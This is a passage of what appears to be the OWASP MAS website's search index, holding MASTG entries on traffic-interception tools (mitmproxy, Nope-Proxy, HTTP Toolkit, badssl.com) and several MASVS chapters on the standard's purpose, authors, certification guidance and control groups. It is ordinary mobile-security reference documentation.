on-the-fly, modify them before they reach their destination, and replay them to a client or server later on.</li> <li>Web Interface: <code>mitmweb</code> is a web-based interface for mitmproxy. It gives you a similar experience as in Chrome's DevTools, plus additional features such as request interception and replay.</li> <li>Python API: Write powerful addons and script mitmproxy with mitmdump. The scripting API offers full control over mitmproxy and makes it possible to automatically modify messages, redirect traffic, visualize messages, or implement custom commands.</li> </ul>","tags":["network","tool"]},{"location":"MASTG/tools/network/MASTG-TOOL-0097/#installation","title":"Installation","text":"<pre><code>brew install mitmproxy\n</code></pre> <p>The installation instructions are here.</p>","tags":["network","tool"]},{"location":"MASTG/tools/network/MASTG-TOOL-0097/#usage","title":"Usage","text":"<p>The documentation is here. Mitmproxy starts as a regular HTTP proxy by default and listens on <code>http://localhost:8080</code>. You need to configure your browser or device to route all traffic through mitmproxy. For example, on Android emulator you need to follow the steps indicated here.</p> <p>For example, to capture all traffic to a file:</p> <pre><code>mitmdump -w outfile\n</code></pre> <p>This runs mitmproxy with the add_header.py script, which simply adds a new header to all responses.</p> <pre><code>mitmdump -s add_header.py\n</code></pre>","tags":["network","tool"]},{"location":"MASTG/tools/network/MASTG-TOOL-0109/","title":"MASTG-TOOL-0109: Nope-Proxy","text":"<p> Nope-Proxy is an extension for Burp that operates as a Non-HTTP Machine-in-the-Middle (MITM) tool, allowing you to intercept both TCP and UDP traffic. Additionally, it allows DNS spoofing on mobile devices to redirect traffic to Burp for the interception of non-HTTP communications. It also includes features such as manual traffic interception, automated traffic manipulation, a Python mangler, and traffic highlighting.</p> <p>It can be installed using the <code>.jar</code> file from the GitHub releases.</p>","tags":["network","tool"]},{"location":"MASTG/tools/network/MASTG-TOOL-0115/","title":"MASTG-TOOL-0115: HTTP Toolkit","text":"<p>HTTP Toolkit is an open-source tool designed to intercept, analyze, and debug HTTPS traffic. The tool captures HTTP traffic from Android, iOS, web or desktop applications.</p> <p>It comes in a (limited) free version and paid version with additional features. HTTP Toolkit allows to setup its CA certificate and disabling SSL pinning via Frida and is also able to intercept HTTP requests from Flutter. In the free version it is not possible to set an up-stream proxy to re-direct the HTTP traffic to a penetration testing tool like BurpSuite.</p> <p>Instead of HTTP Toolkit, you can rely on the tools mentioned in  Intercepting Flutter HTTPS Traffic.</p>","tags":["network","tool"]},{"location":"MASTG/tools/network/MASTG-TOOL-0143/","title":"MASTG-TOOL-0143: badssl","text":"<p> badssl.com is a website maintained by the Chromium project that provides various SSL/TLS certificate configurations for testing security implementations. It offers a comprehensive collection of test subdomains with different certificate issues and configurations to help developers and security testers validate how applications handle SSL/TLS certificate validation.</p> <p>The tool provides test cases for common SSL/TLS vulnerabilities and misconfigurations, including:</p> <ul> <li>Self-signed certificates (<code>self-signed.badssl.com</code>)</li> <li>Expired certificates (<code>expired.badssl.com</code>)</li> <li>Wrong hostname certificates (<code>wrong.host.badssl.com</code>)</li> <li>Untrusted root certificates (<code>untrusted-root.badssl.com</code>)</li> <li>Mixed content scenarios (<code>mixed.badssl.com</code>)</li> <li>Weak cipher suites (<code>rc4.badssl.com</code>, <code>dh512.badssl.com</code>)</li> <li>HSTS testing (<code>hsts.badssl.com</code>)</li> <li>Certificate transparency issues (<code>no-sct.badssl.com</code>)</li> </ul> <p>This makes badssl.com particularly useful for testing the SSL/TLS certificate validation logic of mobile applications and ensuring that they properly reject invalid certificates and handle various security scenarios correctly.</p>","tags":["network","tool"]},{"location":"MASVS/","title":"OWASP MASVS","text":"<p> GitHub Repo</p> <p>The OWASP MASVS (Mobile Application Security Verification Standard) is the industry standard for mobile app security. It can be used by mobile software architects and developers seeking to develop secure mobile applications, as well as security testers to ensure completeness and consistency of test results.</p> <p>To complement the MASVS, the OWASP MAS project also provides the OWASP Mobile Application Security Testing Guide (MASTG), the OWASP Mobile Application Security Weakness Enumeration (MASWE) and the OWASP MAS Checklist which together are the perfect companion for verifying the controls listed in the OWASP MASVS and demonstrate compliance.</p> <p></p> <p> Download the MASVS</p> <p></p>","tags":[]},{"location":"MASVS/#the-masvs-control-groups","title":"The MASVS Control Groups","text":"<p>The standard is divided into various groups of controls, labeled MASVS-XXXXX, that represent the most critical areas of the mobile attack surface:</p> <ul> <li>MASVS-STORAGE: Secure storage of sensitive data on a device (data-at-rest).</li> <li>MASVS-CRYPTO: Cryptographic functionality used to protect sensitive data.</li> <li>MASVS-AUTH: Authentication and authorization mechanisms used by the mobile app.</li> <li>MASVS-NETWORK: Secure network communication between the mobile app and remote endpoints (data-in-transit).</li> <li>MASVS-PLATFORM: Secure interaction with the underlying mobile platform and other installed apps.</li> <li>MASVS-CODE: Security best practices for data processing and keeping the app up-to-date.</li> <li>MASVS-RESILIENCE: Resilience to reverse engineering and tampering attempts.</li> <li>MASVS-PRIVACY: Privacy controls to protect user privacy.</li> </ul> <p>MAS Testing Profiles</p> <p>Starting on v2.0.0 the MASVS does not contain \"verification levels\". The MAS project has traditionally provided three verification levels (L1, L2 and R), which were revisited during the MASVS refactoring in 2023, and have been reworked as \"MAS Testing Profiles\" and moved over to the OWASP MASWE.  While we move things around and as a temporary measure, the OWASP MAS Checklist will still contain the old verification levels, associated with the current MASTG v1 tests. However, note that the levels will be completely reworked and reassigned to the corresponding MASWE weaknesses.</p> <p></p>","tags":[]},{"location":"MASVS/01-Foreword/","title":"Foreword","text":"<p>Technological revolutions can happen quickly. Less than a decade ago, smartphones were clunky devices with little keyboards - expensive playthings for tech-savvy business users. Today, smartphones are an essential part of our lives. We've come to rely on them for information, navigation and communication, and they are ubiquitous both in business and in our social lives.</p> <p>Every new technology introduces new security risks, and keeping up with those changes is one of the main challenges the security industry faces. The defensive side is always a few steps behind. For example, the default reflex for many was to apply old ways of doing things: Smartphones are like small computers, and mobile apps are just like classic software, so surely the security requirements are similar? But it doesn't work like that. Smartphone operating systems are different from desktop operating systems, and mobile apps are different from web apps. For example, the classical method of signature-based virus scanning doesn't make sense in modern mobile OS environments: Not only is it incompatible with the mobile app distribution model, it's also technically impossible due to sandboxing restrictions. Also, some vulnerability classes, such as buffer overflows and XSS issues, are less relevant in the context of run-of-the-mill mobile apps than in, say, desktop apps and web applications (exceptions apply).</p> <p>Over time, our industry has gotten a better grip on the mobile threat landscape. As it turns out, mobile security is all about data protection: Apps store our personal information, pictures, recordings, notes, account data, business information, location and much more. They act as clients that connect us to services we use on a daily basis, and as communications hubs that processes each and every message we exchange with others. Compromise a person's smartphone and you get unfiltered access to that person's life. When we consider that mobile devices are more readily lost or stolen and mobile malware is on the rise, the need for data protection becomes even more apparent.</p> <p>A security standard for mobile apps must therefore focus on how mobile apps handle, store and protect sensitive information. Even though modern mobile operating systems like iOS and Android offer mature APIs for secure data storage and communication, those have to be implemented and used correctly in order to be effective. Data storage, inter-app communication, proper usage of cryptographic APIs and secure network communication are only some of the aspects that require careful consideration.</p> <p>An important question in need of industry consensus is how far exactly one should go in protecting the confidentiality and integrity of data. For example, most of us would agree that a mobile app should verify the server certificate in a TLS exchange. But what about certificate or public key pinning? Does not doing it result in a vulnerability? Should this be a requirement if an app handles sensitive data, or is it maybe even counter-productive? Do we need to encrypt data stored in SQLite databases, even though the OS sandboxes the app? What is appropriate for one app might be unrealistic for another. The MASVS is an attempt to standardize these requirements using profiles that fit different threat scenarios.</p> <p>Furthermore, the appearance of root malware and remote administration tools has created awareness of the fact that mobile operating systems themselves have exploitable flaws, so containerization strategies are increasingly used to afford additional protection to sensitive data and prevent client-side tampering. This is where things get complicated. Hardware- backed security features and OS-level containerization solutions, such as Android Enterprise and Samsung Knox, do exist, but they aren't consistently available across different devices. As a band aid, it is possible to implement software-based protection measures - but unfortunately, there are no standards or testing processes for verifying these kinds of protections.</p> <p>As a result, mobile app security testing reports are all over the place: For example, some testers report a lack of obfuscation or root detection in an Android app as \u201csecurity flaw\u201d. On the other hand, measures like string encryption, debugger detection or control flow obfuscation aren't considered mandatory. However, this binary way of looking at things doesn't make sense because resilience is not a binary proposition: It depends on the particular client-side threats one aims to defend against. Software protections are not useless, but they can ultimately be bypassed, so they must never be used as a replacement for security controls.</p> <p>The overall goal of the MASVS is to offer a baseline for mobile application security, while also allowing for the inclusion of defense-in-depth measures and protections against client-side threats. The MASVS is meant to achieve the following:</p> <ul> <li>Provide requirements for software architects and developers seeking to develop secure mobile applications;</li> <li>Offer an industry standard that can be tested against in mobile app security reviews;</li> <li>Clarify the role of software protection mechanisms in mobile security and provide requirements to verify their effectiveness;</li> <li>Provide specific recommendations as to what level of security is recommended for different use-cases.</li> </ul> <p>We are aware that 100% industry consensus is impossible to achieve. Nevertheless, we hope that the MASVS is useful in providing guidance throughout all phases of mobile app development and testing. As an open source standard, the MASVS will evolve over time, and we welcome any contributions and suggestions.</p> <p>By Bernhard Mueller</p>","tags":[]},{"location":"MASVS/02-Frontispiece/","title":"About the Standard","text":"<p>The OWASP Mobile Application Security Verification Standard (MASVS) is the industry standard for mobile application security. It provides a comprehensive set of security controls that can be used to assess the security of mobile apps across various platforms (e.g., Android, iOS) and deployment scenarios (e.g., consumer, enterprise). The standard covers the key components of the mobile app attack surface including storage, cryptography, authentication and authorization, network communication, interaction with the mobile platform, code quality and resilience against reverse engineering and tampering.</p> <p>The OWASP MASVS is the result of years of community effort and industry feedback. We thank all the contributors who have helped shape this standard. We welcome your feedback on the OWASP MASVS at any time, especially as you apply it to your own organization and mobile app development projects. Getting inputs from a variety of mobile app developers will help us improve and update the standard which is revised periodically based on your inputs and feedback.</p> <p>You can provide feedback using GitHub Discussions in the OWASP MASVS repo https://github.com/OWASP/masvs/discussions, or contact the project leads directly https://mas.owasp.org/contact/.</p> <p>The OWASP MASVS and MASTG are trusted by the following platform providers and standardization, governmental and educational institutions. Learn more.</p> <p> </p>","tags":[]},{"location":"MASVS/02-Frontispiece/#authors","title":"Authors","text":"","tags":[]},{"location":"MASVS/02-Frontispiece/#sven-schleier","title":"Sven Schleier","text":"<p>Sven is specialised in penetration testing and application security and has guided numerous projects to build security in from the start. He strongly believes in knowledge sharing and is speaking worldwide at meetups and conferences, is an adjunct professor and is conducting hands-on workshops about mobile app security to penetration testers, developers and students.</p>","tags":[]},{"location":"MASVS/02-Frontispiece/#carlos-holguera","title":"Carlos Holguera","text":"<p>Carlos is a mobile security research engineer with many years of hands-on experience in security testing for mobile apps and embedded systems such as automotive control units and IoT devices. He is passionate about reverse engineering and dynamic instrumentation of mobile apps and is continuously learning and sharing his knowledge.</p>","tags":[]},{"location":"MASVS/02-Frontispiece/#jeroen-beckers","title":"Jeroen Beckers","text":"<p>Jeroen is a mobile security lead responsible for quality assurance on mobile security projects and for R&amp;D on all things mobile. Ever since his master's thesis on Android security, Jeroen has been interested in mobile devices and their (in)security. He loves sharing his knowledge with other people, as is demonstrated by his many talks &amp; trainings at colleges, universities, clients and conferences.</p>","tags":[]},{"location":"MASVS/02-Frontispiece/#bernhard-mueller","title":"Bernhard Mueller","text":"<p>Bernhard is a cyber security specialist with a talent for hacking systems of all kinds. During more than a decade in the industry, he has published many zero-day exploits for software. BlackHat USA commended his pioneering work in mobile security with a Pwnie Award for Best Research.</p>","tags":[]},{"location":"MASVS/02-Frontispiece/#jeroen-willemsen","title":"Jeroen Willemsen","text":"<p>Jeroen is a principal security architect with a passion for mobile security and risk management. He has supported companies as a security coach, a security engineer and as a full-stack developer. He loves explaining technical subjects: from security issues to programming challenges.</p>","tags":[]},{"location":"MASVS/02-Frontispiece/#contributors","title":"Contributors","text":"<p>All of our contributors are listed in the Contributing section of the OWASP MAS website:</p> <p>https://mas.owasp.org/contributing/</p>","tags":[]},{"location":"MASVS/02-Frontispiece/#donators","title":"Donators","text":"<p>While both the MASVS and the MASTG are created and maintained by the community on a voluntary basis, sometimes outside help is required. We therefore thank our donators for providing the funds to be able to hire technical editors. Note that their donation does not influence the content of the MASVS or MASTG in any way. The Donation Packages are described on the OWASP MAS Website.</p> <p></p>","tags":[]},{"location":"MASVS/02-Frontispiece/#changelog","title":"Changelog","text":"<p>All our Changelogs are available online at the OWASP MASVS GitHub repository, see the Releases page:</p> <p>https://github.com/OWASP/masvs/releases</p>","tags":[]},{"location":"MASVS/02-Frontispiece/#copyright-and-license","title":"Copyright and License","text":"<p>Copyright \u00a9 The OWASP Foundation. This work is licensed under a Creative Commons Attribution-ShareAlike 4.0 International License. For any reuse or distribution, you must make clear to others the license terms of this work.</p> <p></p>","tags":[]},{"location":"MASVS/03-Using_the_MASVS/","title":"The Mobile Application Security Verification Standard","text":"<p>The Mobile Application Security Verification Standard (MASVS) is a comprehensive security standard developed by the Open Worldwide Application Security Project (OWASP). This framework provides a clear and concise set of guidelines and best practices for assessing and enhancing the security of mobile applications. The MASVS is designed to be used as a metric, guidance, and baseline for mobile app security verification, serving as a valuable resource for developers, application owners, and security professionals.</p> <p>The objective of the MASVS is to establish a high level of confidence in the security of mobile apps by providing a set of controls that address the most common mobile application security issues. These controls were developed with a focus on providing guidance during all phases of mobile app development and testing, and to be used as a baseline for mobile app security verification during procurement.</p> <p>By adhering to the controls outlined in the OWASP MASVS, organizations can ensure that their mobile applications are built with security in mind, reducing the risk of security breaches and protecting sensitive user data. Whether used as a metric, guidance, or baseline, the OWASP MASVS is an invaluable tool for enhancing the security of mobile applications.</p> <p>The OWASP MASVS is a living document and is regularly updated to reflect the changing threat landscape and new attack vectors. As such, it's important to stay up-to-date with the latest version of the standard and adapt security measures accordingly.</p>","tags":[]},{"location":"MASVS/03-Using_the_MASVS/#mobile-application-security-model","title":"Mobile Application Security Model","text":"<p>The standard is divided into various groups that represent the most critical areas of the mobile attack surface. These control groups, labeled MASVS-XXXXX, provide guidance and standards for the following areas:</p> <ul> <li>MASVS-STORAGE: Secure storage of sensitive data on a device (data-at-rest).</li> <li>MASVS-CRYPTO: Cryptographic functionality used to protect sensitive data.</li> <li>MASVS-AUTH: Authentication and authorization mechanisms used by the mobile app.</li> <li>MASVS-NETWORK: Secure network communication between the mobile app and remote endpoints (data-in-transit).</li> <li>MASVS-PLATFORM: Secure interaction with the underlying mobile platform and other installed apps.</li> <li>MASVS-CODE: Security best practices for data processing and keeping the app up-to-date.</li> <li>MASVS-RESILIENCE: Resilience to reverse engineering and tampering attempts.</li> <li>MASVS-PRIVACY: Privacy controls to protect user privacy.</li> </ul> <p>Each of these control groups contains individual controls labeled MASVS-XXXXX-Y, which provide specific guidance on the particular security measures that need to be implemented to meet the standard.</p>","tags":[]},{"location":"MASVS/03-Using_the_MASVS/#mas-testing-profiles","title":"MAS Testing Profiles","text":"<p>The MAS project has traditionally provided three verification levels (L1, L2 and R), which were revisited during the MASVS refactoring in 2023, and have been reworked as \"MAS Testing Profiles\" and moved over to the OWASP MASTG. These profiles are now aligned with the NIST OSCAL (Open Security Controls Assessment Language) standard, which is a comprehensive catalog of security controls that can be used to secure information systems.</p> <p>By aligning with OSCAL, the MASVS provides a more flexible and comprehensive approach to security testing. OSCAL provides a standard format for security control information, which allows for easier sharing and reuse of security controls across different systems and organizations. This allows for a more efficient use of resources and a more targeted approach to mobile app security testing.</p> <p>However, it is important to note that implementing these profiles fully or partially should be a risk-based decision made in consultation with business owners. The profiles should be tailored to the specific security risks and requirements of the mobile application being developed, and any deviations from the recommended controls should be carefully justified and documented.</p>","tags":[]},{"location":"MASVS/03-Using_the_MASVS/#assumptions","title":"Assumptions","text":"<p>When using the MASVS, it's important to keep in mind the following assumptions:</p> <ul> <li>The MASVS is not a substitute for following secure development best practices, such as secure coding or secure SDLC. These practices should be followed holistically in your development process and the MASVS complements them specifically for mobile apps.</li> <li>The MASVS assumes that you've followed the relevant standards of your industry and country for all elements of your app's ecosystem, such as backend servers, IoT, and other companion devices.</li> <li>The MASVS is designed to evaluate the security of mobile apps that can be analyzed statically by obtaining the app package, dynamically by running it on a potentially compromised device, and also considers any network-based attacks such as MITM.</li> </ul> <p>While the OWASP MASVS is an invaluable tool for enhancing the security of mobile applications, it cannot guarantee absolute security. It should be used as a baseline for security requirements, but additional security measures should also be implemented as appropriate to address specific risks and threats to the mobile app.</p>","tags":[]},{"location":"MASVS/03-Using_the_MASVS/#security-architecture-design-and-threat-modeling-for-mobile-apps","title":"Security Architecture, Design and Threat Modeling for Mobile Apps","text":"<p>The OWASP MASVS assumes that best practices for secure architecture, design, and threat modeling have been followed as a foundation.</p> <p>Security must be a top priority throughout all stages of mobile app development, from the initial planning and design phase to deployment and ongoing maintenance. Developers need to follow secure development best practices and ensure that security measures are prioritized to protect sensitive data, comply with policies and regulations, and identify and address security issues that can be targeted by attackers.</p> <p>While the MASVS and MASTG focuses on controls and technical test cases for app security assessments, non-technical aspects such as following best practices laid out by OWASP Software Assurance Maturity Model (SAMM) or NIST.SP.800-218 Secure Software Development Framework (SSDF) for secure architecture, design, and threat modeling are still important. The MASVS can also be used as reference and input for a threat model to raise awareness of potential attacks.</p> <p>To ensure that these practices are followed, developers can provide documentation or evidence of adherence to these standards, such as design documents, threat models, and security architecture diagrams. Additionally, interviews can be conducted to collect information on adherence to these practices and provide an understanding of the level of compliance with these standards.</p>","tags":[]},{"location":"MASVS/03-Using_the_MASVS/#secure-app-ecosystem","title":"Secure App Ecosystem","text":"<p>The OWASP MASVS assumes other relevant security standards are also leveraged to ensure that all systems involved in the app's operation meet their applicable requirements.</p> <p>Mobile apps often interact with multiple systems, including backend servers, third-party APIs, Bluetooth devices, cars, IoT devices, and more. Each of these systems may introduce their own security risks that must be considered as part of the mobile app's security design and threat modeling. For example, when interacting with a backend server, the OWASP Application Security Verification Standard (ASVS) should be used to ensure that the server is secure and meets the required security standards. In the case of Bluetooth devices, the app should be designed to prevent unauthorized access, while for cars, the app should be designed to protect the user's data and ensure that there are no safety issues with the car's operation.</p>","tags":[]},{"location":"MASVS/03-Using_the_MASVS/#security-knowledge-and-expertise","title":"Security Knowledge and Expertise","text":"<p>The OWASP MASVS assumes a certain level of security knowledge and expertise among developers and security professionals using the standard. It's important to have a good understanding of mobile app security concepts, as well as the relevant tools and techniques used for mobile app security testing and assessment. To support this, the OWASP MAS project also provides the OWASP Mobile Application Security Testing Guide (MASTG), which provides in-depth guidance on mobile app security testing and assessment.</p> <p>Mobile app development is a rapidly evolving field, with new technologies, programming languages, and frameworks constantly emerging. It's essential for developers and security professionals to stay current with these developments, as well as to have a solid foundation in fundamental security principles.</p> <p>OWASP SAMM provides a dedicated \"Education &amp; Guidance\" domain which aims to ensure that all stakeholders involved in the software development lifecycle are aware of the software security risks and are equipped with the knowledge and skills to mitigate these risks. This includes developers, testers, architects, project managers, executives, and other personnel involved in software development and deployment.</p>","tags":[]},{"location":"MASVS/03-Using_the_MASVS/#applicability-of-the-masvs","title":"Applicability of the MASVS","text":"<p>By adhering to the MASVS, businesses and developers can ensure that their mobile app are secure and meet industry-standard security requirements, regardless of the development approach used. This is the case for downloadable apps, as the project was traditionally focused on, but the MAS resources and guidelines are also applicable to other areas of the business such as preloaded applications and SDKs.</p>","tags":[]},{"location":"MASVS/03-Using_the_MASVS/#native-apps","title":"Native Apps","text":"<p>Native apps are written in platform-specific languages, such as Java/Kotlin for Android or Objective-C/Swift for iOS.</p>","tags":[]},{"location":"MASVS/03-Using_the_MASVS/#cross-platform-and-hybrid-apps","title":"Cross-Platform and Hybrid Apps","text":"<p>Apps based on cross-platform (Flutter, React Native, Xamarin, Ionic, etc.) and hybrid (Cordova, PhoneGap, Framework7, Onsen UI, etc.) frameworks may be susceptible to platform-specific vulnerabilities that don't exist in native apps. For example, some JavaScript frameworks may introduce new security issues that don't exist in other programming languages. It is therefore essential to follow the security best practices of the used frameworks.</p> <p>The MASVS is agnostic to the type of mobile application being developed. This means that the guidelines and best practices outlined in the MASVS can be applied to all types of mobile apps, including cross-platform and hybrid apps.</p>","tags":[]},{"location":"MASVS/03-Using_the_MASVS/#preloads","title":"Preloads","text":"<p>Preloaded apps are apps that are installed on a user's device at factory time and may have elevated privileges that leave users vulnerable to exploitative business practices. Given the large number of preloaded apps on an average user's device, it's important to measure their risk in a quantifiable way.</p> <p>There are hundreds of preloads that may ship on a device, and as a result, automation is critical. A subset of MAS criteria that is automation-friendly may be a good basis.</p>","tags":[]},{"location":"MASVS/03-Using_the_MASVS/#sdks","title":"SDKs","text":"<p>SDKs play a vital role in the mobile app value chain, supplying code developers need to build faster, smarter, and more profitably. Developers rely on them heavily, with the average mobile app using 30 SDKs, and 90% of code sourced from third parties. While this widespread use delivers significant benefits to developers, it also propagates safety and security issues.</p> <p>SDKs offer a variety of functionality, and should be regarded as an individual project. You should evaluate how the MASVS applies to the used SDKs to ensure the highest possible security testing coverage.</p>","tags":[]},{"location":"MASVS/04-Assessment_and_Certification/","title":"Assessment and Certification","text":"","tags":[]},{"location":"MASVS/04-Assessment_and_Certification/#owasps-stance-on-masvs-certifications-and-trust-marks","title":"OWASP's Stance on MASVS Certifications and Trust Marks","text":"<p>OWASP, as a vendor-neutral not-for-profit organization, does not certify any vendors, verifiers or software.</p> <p>All such assurance assertions, trust marks, or certifications are not officially vetted, registered, or certified by OWASP, so an organization relying upon such a view needs to be cautious of the trust placed in any third party or trust mark claiming (M)ASVS certification.</p> <p>This should not inhibit organizations from offering such assurance services, as long as they do not claim official OWASP certification.</p>","tags":[]},{"location":"MASVS/04-Assessment_and_Certification/#guidance-for-certifying-mobile-apps","title":"Guidance for Certifying Mobile Apps","text":"<p>The recommended way of verifying compliance of a mobile app with the MASVS is by performing an \"open book\" review, meaning that the testers are granted access to key resources such as architects and developers of the app, project documentation, source code, and authenticated access to endpoints, including access to at least one user account for each role.</p> <p>It is important to note that the MASVS only covers the security of the  mobile app (client-side). It does not contain specific controls for the remote endpoints (e.g. web services) associated with the app and they should be verified against appropriate standards, such as the OWASP ASVS.</p> <p>A certifying organization must include in any report the scope of the verification (particularly if a key component is out of scope), a summary of verification findings, including passed and failed tests, with clear indications of how to resolve the failed tests. Keeping detailed work papers, screenshots or recording, scripts to reliably and repeatedly exploit an issue, and electronic records of testing, such as intercepting proxy logs and associated notes such as a cleanup list, is considered standard industry practice. It is not sufficient to simply run a tool and report on the failures; this does not provide sufficient evidence that all issues at a certifying level have been tested and tested thoroughly. In case of dispute, there should be sufficient supportive evidence to demonstrate that every verified control has indeed been tested.</p>","tags":[]},{"location":"MASVS/04-Assessment_and_Certification/#using-the-owasp-mobile-application-security-testing-guide-mastg","title":"Using the OWASP Mobile Application Security Testing Guide (MASTG)","text":"<p>The OWASP MASTG is a manual for testing the security of mobile apps. It describes the technical processes for verifying the controls listed in the MASVS. The MASTG includes a list of test cases, each of which map to a control in the MASVS. While the MASVS controls are high-level and generic, the MASTG provides in-depth recommendations and testing procedures on a per-mobile-OS basis.</p> <p>Testing the app's remote endpoints is not covered in the MASTG. For example:</p> <ul> <li>Remote Endpoints: The OWASP Web Security Testing Guide (WSTG) is a comprehensive guide with detailed technical explanation and guidance for testing the security of web applications and web services holistically and can be used in addition to other relevant resources to complement the mobile app security testing exercise.</li> <li>Internet of Things (IoT): The OWASP IoT Security Testing Guide (ISTG) provides a comprehensive methodology for penetration tests in the IoT field offering flexibility to adapt innovations and developments on the IoT market while still ensuring comparability of test results. The guide provides an understanding of communication between manufacturers and operators of IoT devices as well as penetration testing teams that's facilitated by establishing a common terminology.</li> </ul>","tags":[]},{"location":"MASVS/04-Assessment_and_Certification/#the-role-of-automated-security-testing-tools","title":"The Role of Automated Security Testing Tools","text":"<p>The use of source code scanners and black-box testing tools is encouraged in order to increase efficiency whenever possible. It is however not possible to complete MASVS verification using automated tools alone, since every mobile app is different. In order to fully verify the security of the app it is essential to understand the overall architecture, business logic, and technical pitfalls of the specific technologies and frameworks being used.</p>","tags":[]},{"location":"MASVS/04-Assessment_and_Certification/#other-uses","title":"Other Uses","text":"","tags":[]},{"location":"MASVS/04-Assessment_and_Certification/#as-detailed-security-architecture-guidance","title":"As Detailed Security Architecture Guidance","text":"<p>One of the more common uses for the Mobile Application Security Verification Standard is as a resource for security architects. The two major security architecture frameworks, SABSA or TOGAF, are missing a great deal of information that is necessary to complete mobile application security architecture reviews. MASVS can be used to fill in those gaps by allowing security architects to choose better controls for issues common to mobile apps.</p>","tags":[]},{"location":"MASVS/04-Assessment_and_Certification/#as-a-replacement-for-off-the-shelf-secure-coding-checklists","title":"As a Replacement for Off-the-shelf Secure Coding Checklists","text":"<p>Many organizations can benefit from adopting the MASVS, by choosing one of the two levels, or by forking MASVS and changing what is required for each application's risk level in a domain-specific way. We encourage this type of forking as long as traceability is maintained, so that if an app has passed control 4.1, this means the same thing for forked copies as the standard evolves.</p>","tags":[]},{"location":"MASVS/04-Assessment_and_Certification/#as-a-basis-for-security-testing-methodologies","title":"As a Basis for Security Testing Methodologies","text":"<p>A good mobile app security testing methodology should cover all controls listed in the MASVS. The OWASP Mobile Application Security Testing Guide (MASTG) describes black-box and white-box test cases for each verification control.</p>","tags":[]},{"location":"MASVS/04-Assessment_and_Certification/#as-a-guide-for-automated-unit-and-integration-tests","title":"As a Guide for Automated Unit and Integration Tests","text":"<p>The MASVS is designed to be highly testable, with the sole exception of architectural controls. Automated unit, integration and acceptance testing based on the MASVS controls can be integrated in the continuous development lifecycle. This not only increases developer security awareness, but also improves the overall quality of the resulting apps, and reduces the amount of findings during security testing in the pre-release phase.</p>","tags":[]},{"location":"MASVS/04-Assessment_and_Certification/#for-secure-development-training","title":"For Secure Development Training","text":"<p>MASVS can also be used to define characteristics of secure mobile apps. Many \"secure coding\" courses are simply ethical hacking courses with a light smear of coding tips. This does not help developers. Instead, secure development courses can use the MASVS, with a strong focus on the proactive controls documented in the MASVS, rather than e.g. the Top 10 code security issues.</p>","tags":[]},{"location":"MASVS/05-MASVS-STORAGE/","title":"MASVS-STORAGE: Storage","text":"<p>Mobile applications handle a wide variety of sensitive data, such as personally identifiable information (PII), cryptographic material, secrets, and API keys, that often need to be stored locally. This sensitive data may be stored in private locations, such as the app's internal storage, or in public folders that are accessible by the user or other apps installed on the device. However, sensitive data can also be unintentionally stored or exposed to publicly accessible locations, typically as a side-effect of using certain APIs or system capabilities such as backups or logs.</p> <p>This category is designed to help developers ensure that any sensitive data intentionally stored by the app is properly protected, regardless of the target location. It also covers unintentional leaks that can occur due to improper use of APIs or system capabilities.</p> ID statement MASVS-STORAGE-1 The app securely stores sensitive data. MASVS-STORAGE-2 The app prevents leakage of sensitive data. <p></p>","tags":[]},{"location":"MASVS/06-MASVS-CRYPTO/","title":"MASVS-CRYPTO: Cryptography","text":"<p>Cryptography is essential for mobile apps because mobile devices are highly portable and can be easily lost or stolen. This means that an attacker who gains physical access to a device can potentially access all the sensitive data stored on it, including passwords, financial information, and personally identifiable information. Cryptography provides a means of protecting this sensitive data by encrypting it so that it cannot be easily read or accessed by an unauthorized user.</p> <p>The purpose of the controls in this category is to ensure that the verified app uses cryptography according to industry best practices, which are typically defined in external standards such as NIST.SP.800-175B and NIST.SP.800-57. This category also focuses on the management of cryptographic keys throughout their lifecycle, including key generation, storage, and protection. Poor key management can compromise even the strongest cryptography, so it is crucial for developers to follow the recommended best practices to ensure the security of their users' sensitive data.</p> ID statement MASVS-CRYPTO-1 The app employs current strong cryptography and uses it according to industry best practices. MASVS-CRYPTO-2 The app performs key management according to industry best practices. <p></p>","tags":[]},{"location":"MASVS/07-MASVS-AUTH/","title":"MASVS-AUTH: Authentication and Authorization","text":"<p>Authentication and authorization are essential components of most mobile apps, especially those that connect to a remote service. These mechanisms provide an added layer of security and help prevent unauthorized access to sensitive user data. Although the enforcement of these mechanisms must be on the remote endpoint, it is equally important for the app to follow relevant best practices to ensure the secure use of the involved protocols.</p> <p>Mobile apps often use different forms of authentication, such as biometrics, PIN, or multi-factor authentication code generators, to validate user identity. These mechanisms must be implemented correctly to ensure their effectiveness in preventing unauthorized access. Additionally, some apps may rely solely on local app authentication and may not have a remote endpoint. In such cases, it is critical to ensure that local authentication mechanisms are secure and implemented following industry best practices.</p> <p>The controls in this category aim to ensure that the app implements authentication and authorization mechanisms securely, protecting sensitive user information and preventing unauthorized access. It is important to note that the security of the remote endpoint should also be validated using industry standards such as the OWASP Application Security Verification Standard (ASVS).</p> ID statement MASVS-AUTH-1 The app uses secure authentication and authorization protocols and follows the relevant best practices. MASVS-AUTH-2 The app performs local authentication securely according to the platform best practices. MASVS-AUTH-3 The app secures sensitive operations with additional authentication. <p></p>","tags":[]},{"location":"MASVS/08-MASVS-NETWORK/","title":"MASVS-NETWORK: Network Communication","text":"<p>Secure networking is a critical aspect of mobile app security, particularly for apps that communicate over the network. In order to ensure the confidentiality and integrity of data in transit, developers typically rely on encryption and authentication of the remote endpoint, such as through the use of TLS. However, there are numerous ways in which a developer may accidentally disable the platform secure defaults or bypass them entirely by utilizing low-level APIs or third-party libraries.</p> <p>This category is designed to ensure that the mobile app sets up secure connections under any circumstances. Specifically, it focuses on verifying that the app establishes a secure, encrypted channel for network communication. Additionally, this category covers situations where a developer may choose to trust only specific Certificate Authorities (CAs), which is commonly referred to as certificate pinning or public key pinning.</p> ID statement MASVS-NETWORK-1 The app secures all network traffic according to the current best practices. MASVS-NETWORK-2 The app performs identity pinning for all remote endpoints under the developer's control. <p></p>","tags":[]},{"location":"MASVS/09-MASVS-PLATFORM/","title":"MASVS-PLATFORM: Platform Interaction","text":"<p>The security of mobile apps heavily depends on their interaction with the mobile platform, which often involves exposing data or functionality intentionally through the use of platform-provided inter-process communication (IPC) mechanisms and WebViews to enhance the user experience. However, these mechanisms can also be exploited by attackers or other installed apps, potentially compromising the app's security.</p> <p>Furthermore, sensitive data, such as passwords, credit card details, and one-time passwords in notifications, is often displayed in the app's user interface. It is essential to ensure that this data is not unintentionally leaked through platform mechanisms such as auto-generated screenshots or accidental disclosure through shoulder surfing or device sharing.</p> <p>This category comprises controls that ensure the app's interactions with the mobile platform occur securely. These controls cover the secure use of platform-provided IPC mechanisms, WebView configurations to prevent 